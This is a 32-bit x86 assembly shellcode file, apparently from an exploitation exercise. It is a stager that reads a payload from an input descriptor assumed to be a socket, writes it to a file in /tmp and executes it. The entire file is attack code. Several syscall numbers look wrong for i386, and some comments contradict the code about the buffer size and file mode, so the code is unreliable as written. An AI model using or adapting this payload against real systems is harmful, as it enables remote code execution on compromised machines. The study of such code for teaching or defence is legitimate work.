	;; Evan Jensen 32bit Put a file in /tmp and execve it shellcode
	;; Paolo Soto
	;; Sat Mar  9 05:39:07 EST 2013

	;; %eax = syscall number
	;; args = %ebx, %ecx, %edx, %esi, %edi, %ebp (last can be ptr to > 6)
BITS 32
	global main
	
	%define __NR_open   BYTE 0x5
	%define __NR_write  BYTE 0x4
	%define __NR_mmap   BYTE 0x90
	%define __NR_execve BYTE 0x11
	; %define filename   fs:0x28 ; 64 bit
	%define stackcookie [gs:0x14] ; 32 bit
	%define openflags 0x42 ; O_CREAT|O_RDWR
	%define size 0xffff

	; assumption - ebx has the input (socket)
		
main:

	; ebx = 0
	; ecx = size
	; edx = 0x3
	; esi = 0x2
	; edi = eax
	; ebp = 0

	mov edi, ebx            ; edi = input
	xor ecx, ecx
	mov cl, 0x1
	shl ecx, 22		; ecx = 4M 
	xor ebx, ebx 		; ebp = 0
	mov bl, 0x2
	mov si, bx              ; esi = 0x2
	xor ebp, ebp 		; ebp = 0
	mov ebx, ebp 		; ebx = 0
	mov edx, ebp  		
	mov dl, 0x3 		; edx = 3
	mov al, __NR_mmap
	int 0x80 		; mmap(0, 1M, PROT_READ|PROT_WRITE, MAP_PRIVATE, input_fd, 0)

	mov esi, ecx            ; esi = size
	mov edi, eax            ; edi = buffer (temp assignment)

	xor eax, eax 
	push eax
	push dword stackcookie  ; use the stack cookie as a file name 
	push 0x706d742f		; stack = /tmp/filename\0
	mov ebx, esp            ; ebx = stack
	mov ecx, eax
	mov cl, 0x42 		; ecx = O_CREAT|O_RDWR
	mov edx, 0700 		; edx = 0700
	mov al, __NR_open 
	int 0x80 		; open(filename, O_CREAT|O_RDWR, 0600)

	mov ebx, eax 		; ebx = output
	mov ecx, edi 		; ecx = buffer
	mov edx, esi 		; edx = size
	xor eax, eax
	mov al, __NR_write
	int 0x80 		; write(output, buffer, size)
	
	; exec 
	mov ebx, esp 		; ebx = filename
	xor ecx, ecx
	mov edx, ecx
	mov eax, ecx
	mov al, __NR_execve
	int 0x80

	
